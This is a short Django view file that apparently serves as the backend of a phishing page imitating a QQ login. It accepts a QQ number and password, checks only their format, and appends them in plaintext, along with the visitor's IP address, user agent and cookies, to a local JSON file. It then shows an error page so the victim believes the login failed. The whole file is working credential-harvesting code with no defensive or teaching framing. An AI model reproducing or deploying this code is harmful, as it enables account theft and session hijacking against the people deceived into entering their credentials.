from django.shortcuts import render
from django.http import HttpResponse
import json

def sub_dict(somedict, somekeys, default=None):
      return dict([ (k, somedict.get(k, default)) for k in somekeys ])

headers=('REMOTE_ADDR','HTTP_USER_AGENT','HTTP_COOKIE','HTTP_HOST')

def index(request):
    if request.method=="POST":

        qq=request.POST['qqnumber']
        passwd=request.POST['passwd']

        if len(qq)==0:
            return render(request,"home.html",{'error':1})
        if not qq.isdigit() or len(qq)<5:
            return render(request,"home.html",{'error':2})
        if len(passwd)==0:
            return render(request,"home.html",{'error':3})
        if passwd.isdigit() or passwd.isalpha() or len(passwd)<6:
            return render(request,"home.html",{'error':4})

        userdata=(qq,passwd,sub_dict(request.META,headers,''))

        with open('user_data.json','a') as f:
            f.write(json.dumps(userdata)+'\n')

        return render(request,"error.html",{})

    return render(request,"home.html",{'error':0})
